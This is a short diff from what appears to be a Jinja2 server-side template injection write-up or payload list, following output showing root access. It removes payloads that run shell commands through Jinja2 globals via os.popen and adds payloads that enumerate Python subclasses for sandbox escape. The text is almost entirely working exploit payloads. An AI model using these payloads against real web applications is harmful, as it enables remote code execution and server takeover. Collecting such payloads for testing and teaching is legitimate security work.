@@ -245,9 +245,7 @@ uid=0(root) gid=0(root) groups=0(root)
 We are root.
 
 ```
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
-
-{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
-
-{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
 ```
